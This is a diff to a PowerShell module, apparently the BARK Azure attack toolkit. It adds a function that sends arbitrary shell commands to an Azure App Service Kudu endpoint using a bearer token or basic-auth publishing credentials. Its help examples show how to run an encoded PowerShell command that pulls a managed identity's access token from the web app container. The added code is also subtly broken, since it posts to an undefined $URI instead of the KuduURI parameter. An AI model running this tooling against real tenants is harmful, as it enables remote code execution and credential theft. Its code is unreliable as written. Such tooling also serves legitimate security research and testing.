@@ -7614,7 +7614,7 @@ Function Get-AllAzureRMWebApps {
     Uses the JWT in the $Token variable to list all Azure App Service web apps under the subscription with ID starting with "839..." and put them into the $WebApps variable
     
     .LINK
-        https://medium.com/p/74aee1006f48
+        https://medium.com/p/c3adefccff95
     #>
     [CmdletBinding()] Param (
         [Parameter(
@@ -7690,7 +7690,7 @@ Function Get-AzureRMWebAppPublishingCredentials {
     Uses the JWT in the $Token variable to list all publishing credentials stored on the Azure App Service Web Apps specified with the WebAppID parameter
     
     .LINK
-        https://medium.com/p/74aee1006f48
+        https://medium.com/p/c3adefccff95
     #>
     [CmdletBinding()] Param (
         [Parameter(
@@ -7729,5 +7729,188 @@ Function Get-AzureRMWebAppPublishingCredentials {
     $PublishingCred | Add-Member Noteproperty 'DeploymentURI' $Results.properties.scmUri
 
     $PublishingCred
+
+}
+
+Function Invoke-AzureRMWebAppShellCommand {
+    <#
+    .SYNOPSIS
+        This function takes a provided JWT or Base64-encoded authentication string, then uses those to authenticate to a provided
+        Kudu URI for an Azure App Service Web App. If successful, returns the command output. If an error occurs, prints the error.
+
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+
+    .DESCRIPTION
+        This function takes a provided JWT or Base64-encoded authentication string, then uses those to authenticate to a provided
+        Kudu URI for an Azure App Service Web App. If successful, returns the command output. If an error occurs, prints the error.
+
+    .PARAMETER Token
+        An AzureRM-scoped JSON Web Token (JWT) for a principal with "Owner", "Contributor", or "Website Contributor" role against the
+        Azure Web App.
+
+    .PARAMETER BasicAuthString
+        The Base64-encoded username and password for the FTPS, application-scope credentials.
+
+    .PARAMETER KuduURI
+        The URI for the Kudu "buddy site". If the Azure Web App's URL is https://mycoolwindowswebapp.azurewebsites.net/, the KuduURI will
+        be https://mycoolwindowswebapp.scm.azurewebsites.net/api/command
+
+    .PARAMETER Command
+        The shell command you want to run. You may need to use base64 encoding in your command to deal with quotation issues as the command
+        will be parsed by the Kudu process before being executed. See the examples for an example of how to do this.
+
+    .EXAMPLE
+        PS C:\> $Username = "`$mycoolwindowswebapp"
+        PS C:\> $Password = "asdf1234"
+        PS C:\> $base64Auth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("$($Username):$($Password)")))
+        PS C:\> Invoke-AzureRMWebAppShellCommand -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" -basicauthstring $base64Auth -Command "hostname"
+
+        Description
+        -----------
+        Authenticates to the Kudu API endpoint using basic authentication, using the Username and Password provided. Runs the "hostname" command
+        on the Web App container and returns either the output or an error.
+
+    .EXAMPLE
+        PS C:\> $ARMToken = (Get-AzureRMTokenWithClientCredentials `
+                    -ClientID "a6bc98d3-f706-4b94-b562-0720faf8986f" `
+                    -ClientSecret "asdf1234" `
+                    -TenantName "contoso.onmicrosoft.com").access_token
+        
+        PS C:\> Invoke-AzureRMWebAppShellCommand -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" -token $ARMToken -Command "hostname"
+
+        Description
+        -----------
+
+        First retrieves an AzureRM-scoped token for a service principal using BARK's Get-AzureRMTokenWithClientCredentials cmdlet,
+        then passes that token in the "-token" argument to run the "hostname" command on the Azure App Service Web App container.
+
+    .EXAMPLE
+        PS C:\> $PowerShellCommand = '
+                $headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}
+                $response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers $headers
+                $response.RawContent'
+        PS C:\> $base64Cmd = [System.Convert]::ToBase64String(
+                    [System.Text.Encoding]::Unicode.GetBytes(
+                        $PowerShellCommand
+                    )
+                )
+        PS C:\> $Command = "powershell -enc $($base64Cmd)"
+        PS C:\> Invoke-AzureRMWebAppShellCommand -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" -token $ARMToken -Command $Command
+
+        Description
+        -----------
+
+        Extracts a JWT for the service principal associated with the Web App via a Managed Identity assignment. First, put the commands for JWT
+        request into the $PowerShellCommand variable. Second, base64-encode this command. Third, pass the base64-encoded command into a $Command
+        variable, which is the command that will run on the Web App container. Finally, use Invoke-AzureRMWebAppShellCommand to execute the command,
+        which will display the JWT for the service principal if successful.
+
+    .LINK
+        https://medium.com/p/c3adefccff95
+
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $False,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $False,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $BasicAuthString,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $KuduURI,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Command
+    )
+
+    If ($Token -And $BasicAuthString) {
+        Write-Error "You provided a `$Token and a `$BasicAuthString. Please only specify either a `$Token or a `$BasicAuthString, but not both."
+        Break
+    }
+
+    If ($BasicAuthString) {
+        # We have a basic auth string
+
+        $body = @{
+            command = $Command
+        }
+        $Request = Invoke-WebRequest `
+            -UseBasicParsing `
+            -Uri $URI `
+            -Method "POST" `
+            -WebSession $session `
+            -Headers @{
+                "Authorization"="Basic $($BasicAuthString)"
+            } `
+            -ContentType "application/json" `
+            -Body $($body | ConvertTo-Json) 
+
+        If (($Request.Content | ConvertFrom-JSON).Error -eq "") {
+            $Output = $Request.Content | ConvertFrom-JSON | Select -Expand Output
+        } 
+
+        Else {
+            # There was an error when running the command
+            $Output = $Request.Content | ConvertFrom-JSON | Select -Expand Error
+        }
+
+        $Output
+
+    }
+
+    ElseIf ($Token) {
+        # We have a token
+
+        $body = @{
+            command = $Command
+        }
+        $Request = Invoke-WebRequest `
+            -UseBasicParsing `
+            -Uri $URI `
+            -Method "POST" `
+            -WebSession $session `
+            -Headers @{
+                "Authorization"="Bearer $($Token)"
+            } `
+            -ContentType "application/json" `
+            -Body $($body | ConvertTo-Json) 
+
+        If (($Request.Content | ConvertFrom-JSON).Error -eq "") {
+            $Output = $Request.Content | ConvertFrom-JSON | Select -Expand Output
+        } 
+
+        Else {
+            # There was an error when running the command
+            $Output = $Request.Content | ConvertFrom-JSON | Select -Expand Error
+        }
+
+        $Output
+    }
+
+    Else {
+        Write-Error "You must provide either a `$Token or `$BasicAuthString to authenticate to the Kudu endpoint"
+    }
 
 }
